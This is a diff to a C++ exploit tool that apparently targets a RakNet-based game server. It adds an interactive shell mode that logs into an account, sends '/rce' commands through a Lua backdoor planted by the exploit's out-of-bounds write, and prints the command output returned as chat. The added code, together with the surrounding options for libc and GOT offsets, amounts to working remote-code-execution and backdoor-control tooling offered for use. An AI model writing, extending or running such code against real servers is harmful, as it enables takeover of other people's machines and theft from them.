@@ -247,6 +247,80 @@ static void sendChatBytes(Cli &c, const void *p, size_t n)
 }
 static void sendChatStr(Cli &c, const std::string &s) { sendChatBytes(c, s.data(), s.size()); }
 
+// ---- interactive shell over the installed Lua /rce backdoor: log in a throwaway account, chat in/out ----
+// Answer the server's PasswordDialog (register on first use, log in after), then send "/rce <cmd>" as chat
+// and read the command output back as server chat messages. No memory corruption here; the backdoor is
+// already installed by the exploit, and this is an ordinary game client driving it.
+static void guiRespond(Cli &c, int id, int type, const char *data)
+{
+    BitStream bs; hdr(c, bs, ID_GUI_MESSAGEBOX);
+    bs.Write(id); bs.Write(type);                                        // echo the server's dialog id (avoids the banlist trap)
+    RakString label(""); bs.Write(label);                               // RW(label, send)
+    RakString d(data); RakString::SerializeCompressed(d.C_String(), &bs); // RW(data, send, true) -> the password
+    RakString note(""); bs.Write(note);                                 // RW(note, send)
+    snd(c, bs); usleep(120000);
+}
+
+static bool readChat(Cli &c, int ms, std::string &out)
+{
+    bool got = false;
+    for (int i = 0; i < ms / 20; i++) {
+        for (Packet *p = c.peer->Receive(); p; c.peer->DeallocatePacket(p), p = c.peer->Receive()) {
+            if (p->data[0] != ID_CHAT_MESSAGE) continue;
+            BitStream rd(p->data, p->length, false);
+            unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
+            RakString rs; rd.Read(rs);
+            out += rs.C_String(); got = true;
+        }
+        usleep(20000);
+    }
+    return got;
+}
+
+static int runShell(const char *name, const char *acctPass)
+{
+    Cli A{};
+    if (!connectTo(A, "")) { printf("[!] could not connect (server password / reachability)\n"); return 1; }
+    handshake(A, name);
+    printf("[*] authenticating account '%s' (registers on first use, logs in after)...\n", name);
+    bool authed = false;
+    for (int i = 0; i < 300 && !authed; i++) {
+        for (Packet *p = A.peer->Receive(); p; A.peer->DeallocatePacket(p), p = A.peer->Receive()) {
+            if (g_verbose) fprintf(stderr, "[pkt] id=%d len=%d\n", p->data[0], p->length);
+            if (p->data[0] == ID_GUI_MESSAGEBOX) {
+                BitStream rd(p->data, p->length, false);
+                unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
+                int gid = 0, gtype = 0; rd.Read(gid); rd.Read(gtype);
+                if (g_verbose) fprintf(stderr, "[gui] id=%d type=%d\n", gid, gtype);
+                if (gid == 1 || gid == 2) guiRespond(A, gid, gtype, acctPass);  // LOGIN or REGISTER dialog (echo id)
+            } else if (p->data[0] == ID_CHAT_MESSAGE) {
+                BitStream rd(p->data, p->length, false);
+                unsigned char id; rd.Read(id); RakNetGUID g; rd.Read(g);
+                RakString rs; rd.Read(rs); std::string m = rs.C_String();
+                if (g_verbose) fprintf(stderr, "[chat] \"%s\"\n", m.c_str());
+                if (m.find("successfully") != std::string::npos) { authed = true; printf("[+] %s", m.c_str()); if (!m.empty() && m.back() != '\n') printf("\n"); }
+            }
+        }
+        usleep(50000);
+    }
+    if (!authed) { printf("[!] login did not complete. Wrong password for an existing account, or the server rejected it.\n"); return 1; }
+    std::string banner; readChat(A, 500, banner);
+    printf("[*] shell ready. commands run as the server user via the /rce backdoor. ctrl-D to exit.\n\n");
+    char line[8192];
+    for (;;) {
+        printf("prod$ "); fflush(stdout);
+        if (!fgets(line, sizeof line, stdin)) { printf("\n"); break; }
+        size_t n = strlen(line); while (n && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = 0;
+        if (!n) continue;
+        std::string out;
+        sendChatStr(A, std::string("/rce ") + line);
+        readChat(A, 3000, out);
+        if (out.empty()) printf("[no response]\n");
+        else { fputs(out.c_str(), stdout); if (out.back() != '\n') printf("\n"); }
+    }
+    return 0;
+}
+
 // The OOB write: equipment index 25 lands count|charge on chatMessage._M_p, so this aims the next
 // chat message's bytes at an arbitrary address.
 static void redirect(Cli &c, uint64_t val)
@@ -436,7 +510,9 @@ int main(int argc, char **argv)
     // egress interface, so A and R simply get two source ports from the same address, which the server
     // keys apart by SystemAddress. Override with -b only if you specifically need a fixed source address.
     const char *bind2 = "", *nameBase = "rce", *cell = "ExploitCell";
+    int shellMode = 0; const char *acctPass = "rce-poc-pw-1";
     static struct option lo[] = {
+        {"shell", no_argument, 0, 's'}, {"account-pass", required_argument, 0, 'A'},
         {"server-password", required_argument, 0, 'P'}, {"command", required_argument, 0, 'c'},
         {"token", required_argument, 0, 't'}, {"bind", required_argument, 0, 'b'},
         {"name", required_argument, 0, 'n'}, {"cell", required_argument, 0, 'C'},
@@ -447,7 +523,7 @@ int main(int argc, char **argv)
     const char *libcPath = 0, *serverBin = 0;
     int mGiven = 0, sGiven = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:pL:B:M:S:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -456,6 +532,8 @@ int main(int argc, char **argv)
             case 'n': nameBase = optarg; break;
             case 'C': cell = optarg; break;
             case 'p': g_probe = 1; break;
+            case 's': shellMode = 1; break;
+            case 'A': acctPass = optarg; break;
             case 'L': libcPath = optarg; break;
             case 'B': serverBin = optarg; break;
             case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
@@ -466,6 +544,12 @@ int main(int argc, char **argv)
     }
     if (optind < argc) g_host = argv[optind++];
     if (optind < argc) g_port = atoi(argv[optind++]);
+
+    if (shellMode) {
+        printf("[*] shell client -> %s:%d (account '%s'). Backdoor must already be installed.\n", g_host, g_port, nameBase);
+        fingerprint();
+        return runShell(nameBase, acctPass);
+    }
 
     if (serverBin) {
         if (!readServerBin(serverBin, P.vtable_rva, P.strlen_got, P.malloc_got)) {
